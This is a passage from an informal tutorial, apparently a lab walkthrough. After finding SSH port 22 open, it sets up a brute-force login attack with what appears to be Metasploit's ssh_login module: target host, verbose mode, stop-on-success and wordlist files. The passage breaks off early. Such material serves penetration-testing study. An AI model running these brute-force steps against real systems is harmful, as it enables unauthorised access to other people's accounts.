We can see ssh port 22 open. Booyah! 
Well see how to utilize the port to break into the system. We'll apply brute force attack to get a control over the target system. Let's proceed!
type `search ssh_login` to see possible methods of exploit...

Now, use the `set` command to set your preferences. I'll set mine. You can follow that or If you have specific needs, you'll proceed with yours.
- set the host IP
```bash
set RHOSTS 192.168.0.100 
```
- set verbose mode on
```bash
set VERBOSE true
```
- stop on success
```bash
set STOP_ON_SUCCESS true
```
- Now, here comes the most important part. Setting the wordlist file.
```bash
set USER_FILE ~/<path>/<to>/<yourfile>/dict.txt
set PASS_FILE ~/<path>/<to>/<yourfile>/pass.txt
```
see....
